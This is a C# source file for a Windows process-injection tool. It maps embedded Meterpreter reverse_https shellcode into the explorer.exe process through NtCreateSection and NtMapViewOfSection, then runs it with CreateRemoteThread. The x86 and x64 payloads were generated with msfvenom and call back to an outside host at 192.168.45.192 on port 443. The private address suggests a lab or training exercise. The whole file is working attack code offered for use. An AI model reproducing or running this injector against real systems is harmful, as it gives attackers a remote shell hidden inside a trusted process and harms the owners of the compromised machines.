using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Inject2
{
    internal class Program
    {
        // https://www.pinvoke.net/default.aspx/kernel32/MapViewOfFile.html?diff=y
        private static readonly uint SECTION_MAP_READ = 0x0004;
        private static readonly uint SECTION_MAP_WRITE = 0x0002;
        private static readonly uint SECTION_MAP_EXECUTE = 0x0008;
        // https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint SEC_COMMIT = 0x8000000;
        private static readonly uint PAGE_READWRITE = 0x04;
        private static readonly uint PAGE_READEXECUTE = 0x20;
        private static readonly uint PAGE_NOACCESS = 0x01;
        private static readonly uint MEM_RELEASE = 0x00008000;
        private static readonly uint MEM_DECOMMIT = 0x00004000;
        private static readonly uint DELETE = 0x00010000;

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);


        static void Main(string[] args)
        {
            byte[] buf;
            IntPtr hremoteProcess = default;

            Process[] targetProcess = Process.GetProcessesByName("explorer"); //You can change it.
            bool processArch = false;

            //Open remote process
            hremoteProcess = OpenProcess(0x001F0FFF, false, targetProcess[0].Id);
            IsWow64Process(hremoteProcess, out processArch);



            // Local process handle
            IntPtr hlocalProcess = Process.GetCurrentProcess().Handle;

            // x86 Payload: msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.192 LPORT=443 EXITFUNC=thread -f csharp
            byte[] bufx86 = new byte[523] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
                0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
                0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
                0x8b,0x58,0x20,0x01,0xd3,0x50,0x8b,0x48,0x18,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,
                0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
                0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
                0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,
                0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x51,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,
                0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x31,0x30,0x2e,0x30,0x3b,0x20,
                0x57,0x69,0x6e,0x36,0x34,0x3b,0x20,0x78,0x36,0x34,0x3b,0x20,0x72,0x76,0x3a,0x31,0x32,0x34,0x2e,0x30,0x29,0x20,0x47,0x65,
                0x63,0x6b,0x6f,0x2f,0x32,0x30,0x31,0x30,0x30,0x31,0x30,0x31,0x20,0x46,0x69,0x72,0x65,0x66,0x6f,0x78,0x2f,0x31,0x32,0x34,
                0x2e,0x30,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0xbb,0x00,
                0x00,0x00,0x2f,0x67,0x45,0x4e,0x37,0x78,0x75,0x55,0x54,0x74,0x50,0x6d,0x41,0x7a,0x59,0x48,0x4d,0x35,0x69,0x6a,0x7a,0x4d,
                0x51,0x78,0x55,0x39,0x65,0x4d,0x35,0x2d,0x75,0x35,0x77,0x30,0x74,0x5f,0x7a,0x50,0x61,0x61,0x46,0x46,0x45,0x00,0x50,0x68,
                0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,
                0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,
                0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,
                0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4b,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,
                0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,
                0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,
                0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,0x2e,0x31,0x39,0x32,0x00,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,
                0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,
                0xd5};

            // x64 Payload: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.192 LPORT=443 EXITFUNC=thread -f csharp
            byte[] bufx64 = new byte[793] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
                0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x56,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,
                0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
                0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
                0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x50,0x49,0x01,0xd0,
                0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,
                0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
                0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
                0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
                0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
                0x2e,0x34,0x35,0x2e,0x31,0x39,0x32,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,
                0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xee,0x00,0x00,0x00,0x2f,0x64,0x70,0x66,
                0x4e,0x76,0x4c,0x64,0x38,0x46,0x2d,0x78,0x41,0x6d,0x45,0x47,0x61,0x4a,0x6e,0x30,0x7a,0x5f,0x77,0x4a,0x6e,0x62,0x39,0x48,
                0x33,0x76,0x31,0x42,0x52,0x4a,0x75,0x46,0x5a,0x70,0x44,0x4c,0x33,0x78,0x72,0x56,0x6d,0x76,0x67,0x63,0x65,0x47,0x59,0x54,
                0x42,0x61,0x34,0x2d,0x4a,0x4b,0x61,0x78,0x68,0x49,0x35,0x79,0x74,0x54,0x76,0x55,0x59,0x2d,0x32,0x6e,0x49,0x4e,0x6e,0x42,
                0x58,0x75,0x64,0x63,0x5a,0x4a,0x4d,0x4c,0x42,0x37,0x5f,0x54,0x4e,0x63,0x31,0x58,0x30,0x57,0x57,0x79,0x77,0x38,0x59,0x56,
                0x58,0x33,0x70,0x62,0x7a,0x65,0x76,0x43,0x39,0x37,0x71,0x79,0x78,0x70,0x79,0x4e,0x4f,0x73,0x52,0x46,0x76,0x52,0x67,0x5a,
                0x37,0x6b,0x2d,0x7a,0x46,0x48,0x36,0x64,0x56,0x58,0x4b,0x46,0x5f,0x4a,0x67,0x6f,0x79,0x70,0x67,0x56,0x74,0x6f,0x78,0x71,
                0x2d,0x48,0x61,0x5f,0x65,0x75,0x48,0x33,0x32,0x2d,0x66,0x49,0x50,0x6c,0x74,0x54,0x58,0x52,0x74,0x51,0x4a,0x76,0x52,0x55,
                0x34,0x6c,0x4a,0x46,0x4f,0x7a,0x6a,0x31,0x4d,0x64,0x55,0x75,0x32,0x54,0x36,0x61,0x59,0x31,0x59,0x4c,0x71,0x64,0x61,0x57,
                0x73,0x6c,0x54,0x53,0x59,0x63,0x6b,0x73,0x4b,0x57,0x4b,0x42,0x53,0x59,0x36,0x48,0x66,0x4b,0x45,0x61,0x43,0x4a,0x44,0x35,
                0x78,0x4b,0x6b,0x52,0x36,0x31,0x4b,0x77,0x37,0x6d,0x75,0x51,0x4b,0x6a,0x43,0x78,0x65,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,
                0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,
                0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,
                0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,
                0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,
                0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,
                0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,
                0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,
                0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,
                0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,
                0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};

            if (processArch == true)
            {
                //Injected process is x86
                buf = bufx86;
                Console.WriteLine("Shellcode injected to x86 process.");
            }
            else
            {
                //Injected process is x64
                buf = bufx64;
                Console.WriteLine("Shellcode injected to x64 process.");

            }

            int len = buf.Length;
            uint bufferLength = (uint)len;

            // Create a new section.
            IntPtr sectionHandler = new IntPtr();
            long createSection = (int)NtCreateSection(ref sectionHandler, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref bufferLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            Console.WriteLine("[+] New section was created on processID: " + targetProcess[0].Id);
            //Console.WriteLine("1st breakpoint. Press Enter to continue ...");
            //Console.ReadLine();

            // Map the new section for the LOCAL process.
            IntPtr localBaseAddress = new IntPtr();
            int sizeLocal = 4096;
            ulong offsetSectionLocal = new ulong();


            long mapSectionLocal = NtMapViewOfSection(sectionHandler, hlocalProcess, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, PAGE_READWRITE);

            // Convert Demical to Hex
            var localBaseAddrString = string.Format("{0:X}", localBaseAddress); //Pointer -> String (DEC) format.
            UInt64 localBaseAddrInt = UInt64.Parse(localBaseAddrString); //String -> Integer
            string localBaseAddHex = localBaseAddrInt.ToString("x"); //Integer -> Hex

            Console.WriteLine("[+] New section mapped for the LOCAL process!");
            Console.WriteLine("Local ProcessID: " + Process.GetCurrentProcess().Id);
            Console.WriteLine("Local Process BaseAddress: 0x" + localBaseAddHex);
            Console.WriteLine("View size: " + sizeLocal);
            Console.WriteLine("Offset: " + offsetSectionLocal);
            //Console.WriteLine("2nd breakpoint. Press Enter to continue ...");
            //Console.ReadLine();

            // Map the new section for the REMOTE process.
            IntPtr remoteBaseAddress = new IntPtr();
            int sizeRemote = 4096;
            ulong offsetSectionRemote = new ulong();
            long mapSectionRemote = NtMapViewOfSection(sectionHandler, hremoteProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, PAGE_READEXECUTE);

            // Convert Demical to Hex
            var remoteBaseAddrString = string.Format("{0:X}", remoteBaseAddress); //Pointer -> String (DEC) format.
            UInt64 remoteBaseAddrInt = UInt64.Parse(remoteBaseAddrString); //String -> Integer
            string remoteBaseAddHex = remoteBaseAddrInt.ToString("x"); //Integer -> Hex

            Console.WriteLine("[+] New section mapped for the REMOTE process!");
            Console.WriteLine("Remote ProcessID: " + targetProcess[0].Id);
            Console.WriteLine("Remote Process BaseAddress: 0x" + remoteBaseAddHex);
            Console.WriteLine("View size: " + sizeRemote);
            Console.WriteLine("Offset: " + offsetSectionRemote);
            //Console.WriteLine("3rd breakpoint. Press Enter to continue ...");
            //Console.ReadLine();

            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);
            Console.WriteLine("[+] Shellcode copied to local process: 0x" + localBaseAddHex);
            Console.WriteLine("[+] Mapped to remote process address: 0x" + remoteBaseAddHex);
            //Console.WriteLine("4th breakpoint. Press Enter to continue ...");
            //Console.ReadLine();


            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    // https://stackoverflow.com/questions/2057469/how-can-i-display-a-pointer-address-in-c
                    //string bufAddress = string.Format("0x{0:X}", new IntPtr(p2));

                    //Convert DEC->HEX
                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
                    string bufHex = bufInt.ToString("x"); //Integer -> Hex

                    Console.WriteLine("[+] Payload Address on this executable: " + "0x" + bufHex);

                }
            }


            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            //Create a remote thread and execute it.
            IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);

            //IntPtr hRemoteThread;
            //uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, hremoteProcess, remoteBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            if (hThread != null)
            {
                Console.WriteLine("[+] Injection Succeded!");
            }
            else
            {
                Console.WriteLine("[-] Injection failed!");
            }

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }

            }

            // Unmap the locally mapped section: 'NtUnMapViewOfSection'
            uint unmapStatus = NtUnmapViewOfSection(hlocalProcess, localBaseAddress);
            Console.WriteLine("[+] Local memory section unmapped!");

            // Close the section
            int SectionStatus = NtClose(sectionHandler);
            Console.WriteLine("[+] Memory section closed!");
        }
    }
}
